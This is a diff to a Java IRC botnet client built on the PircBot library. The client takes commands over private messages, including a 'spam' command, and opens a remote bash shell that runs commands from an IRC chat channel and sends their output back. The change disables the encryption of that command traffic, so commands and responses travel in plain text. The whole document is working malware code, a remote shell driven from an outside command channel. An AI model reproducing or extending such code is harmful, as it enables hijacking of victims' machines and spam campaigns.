@@ -96,9 +96,9 @@ public class BotnetClient extends PircBot {
 	protected void onPrivateMessage(String sender, String login, String hostname, String message) {
 		try {
 			// TODO: maybe need to put this back
-			System.out.println(message);
-			message = startMsgE.decryptMsg(message);
-			System.out.println(message);
+			//System.out.println(message);
+			//message = startMsgE.decryptMsg(message);
+			//System.out.println(message);
 			if (message.toLowerCase().startsWith("spam")) {
 				String[] parts = message.split(" ");
 				if (parts.length < 8) {
@@ -247,18 +247,18 @@ public class BotnetClient extends PircBot {
 	        			String s = bashout.readLine();
 	        			while (s != null && !s.equals(SENTINEL)) {
 	        				// TODO: maybe need to change this
-	        				System.out.println(s);
-	        				String encS = startMsgE.encryptMsg(s);
-	        				System.out.println(encS);
-	        				chat.sendLine(encS);
-	        				//chat.sendLine(s);
+	        				//System.out.println(s);
+	        				//String encS = startMsgE.encryptMsg(s);
+	        				//System.out.println(encS);
+	        				//chat.sendLine(encS);
+	        				chat.sendLine(s);
 	        				System.out.println("bash response: " + s);
 	        				s = bashout.readLine();
 	        			}
-	        			//chat.sendLine(s);
-	        			System.out.println(s);
-	        			System.out.println(startMsgE.encryptMsg(s));
-	        			chat.sendLine(startMsgE.encryptMsg(s));
+	        			chat.sendLine(s);
+	        			//System.out.println(s);
+	        			//System.out.println(startMsgE.encryptMsg(s));
+	        			//chat.sendLine(startMsgE.encryptMsg(s));
 	        		}
 		        	chat.close();
 		        	inputThread.kill();
@@ -339,18 +339,18 @@ public class BotnetClient extends PircBot {
 	    	try {
 	    		bashin.println("echo `pwd` '$: '");
 		    	// TODO: make decrypted
-	    		String encCommand = chat.readLine();
-	    		String command = startMsgE.decryptMsg(encCommand);
-	    		System.out.println(encCommand);
-	    		System.out.println(command);
-	    		//String command = chat.readLine();
+	    		//String encCommand = chat.readLine();
+	    		//String command = startMsgE.decryptMsg(encCommand);
+	    		//System.out.println(encCommand);
+	    		//System.out.println(command);
+	    		String command = chat.readLine();
 	        	while (command != null && !command.equalsIgnoreCase(TERMINATION) && !terminate) {
 	        		System.out.println("command: " + command);
 	        		bashin.println(command);
 	        		bashin.println("echo `pwd` '$: '");
-	        		//command = chat.readLine();
-	        		encCommand = chat.readLine();
-	        		command = startMsgE.decryptMsg(encCommand);
+	        		command = chat.readLine();
+	        		//encCommand = chat.readLine();
+	        		//command = startMsgE.decryptMsg(encCommand);
 	        	}
 	        	bashin.println("exit 0");
 	    	} catch (Exception e) {
